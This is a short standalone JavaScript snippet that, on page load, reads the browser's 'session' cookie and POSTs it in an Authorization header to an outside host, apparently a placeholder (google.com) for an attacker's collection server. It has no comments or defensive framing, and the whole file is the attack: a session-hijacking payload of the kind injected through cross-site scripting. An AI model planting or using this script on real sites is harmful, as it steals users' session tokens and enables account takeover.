window.addEventListener("load", function(evt) {
    event.preventDefault();
    fetch('https://google.com', {
        method: 'POST',
        headers: {
            'Authorization': getCookie("session")
        },
    });
})
function getCookie(name) {
    function escape(s) { return s.replace(/([.*+?\^$(){}|\[\]\/\\])/g, '\\$1'); }
    var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(name) + '=([^;]*)'));
    return match ? match[1] : null;
}